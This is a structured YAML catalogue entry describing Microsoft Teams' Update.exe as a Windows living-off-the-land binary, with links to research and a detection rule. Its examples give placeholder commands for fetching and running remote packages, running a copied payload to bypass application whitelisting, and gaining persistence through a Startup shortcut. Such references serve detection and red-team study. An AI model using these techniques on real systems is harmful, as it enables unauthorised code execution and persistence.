---
id: windows-execution-update
namespace: windows:execution:update
name: update
description: 'Binary to update the existing installed Nuget/squirrel package. Part
  of Microsoft Teams installation. Located at: C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- network.transfer.download
- security.defense-evasion.bypass
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- update
parameters: []
features:
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- stealth
execution:
  template: update
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: The above binary will go to url and look for RELEASES file and download
    the nuget package. (Download binary)
  command: Update.exe --download {REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: Update.exe --update={REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: Update.exe --update={REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA. (Download and execute binary)
  command: Update.exe --update={PATH_SMB:folder}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA. (Download and execute binary)
  command: Update.exe --update={PATH_SMB:folder}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: Update.exe --updateRollback={REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: Update.exe --updateRollback={REMOTEURL}
- description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\.
    Then run the command. Update.exe will execute the file you copied. (Application
    Whitelisting Bypass)
  command: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA. (Download and execute binary)
  command: Update.exe --updateRollback={PATH_SMB:folder}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA. (Download and execute binary)
  command: Update.exe --updateRollback={PATH_SMB:folder}
- description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\.
    Then run the command. Update.exe will execute the file you copied. (Execute binary)
  command: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
- description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then
    run the command. Update.exe will create a shortcut to the specified executable
    in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will
    run on every login of the user who runs it. (Execute binary)
  command: Update.exe --createShortcut={PATH:.exe} -l=Startup
- description: Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start
    Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut"
    described on this page. (Execute binary)
  command: Update.exe --removeShortcut={PATH:.exe}-l=Startup
references:
- label: watch?v=rOP3hnkj7ls
  url: https://www.youtube.com/watch?v=rOP3hnkj7ls
- label: '1144182772623269889'
  url: https://twitter.com/reegun21/status/1144182772623269889
- label: '1143928885211537408'
  url: https://twitter.com/MrUn1k0d3r/status/1143928885211537408
- label: '1291005287034281990'
  url: https://twitter.com/reegun21/status/1291005287034281990
- label: ''
  url: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- label: nuget-squirrel-uncontrolled-endpoints-leads-to-arb
  url: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- label: update-nuget-squirrel-uncontrolled-endpoints-leads
  url: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
- label: ''
  url: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/
techniques:
- exfiltration
- defense-evasion
- execution
- persistence
mitre_ids:
- T1218
- T1547
- T1070
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
- type: ioc
  description: Update.exe spawned an unknown process
install:
- method: choco
  package_name: update
  commands:
  - choco install update
---

# update

update is a Windows LOLBin. Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation. Located at: C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe.
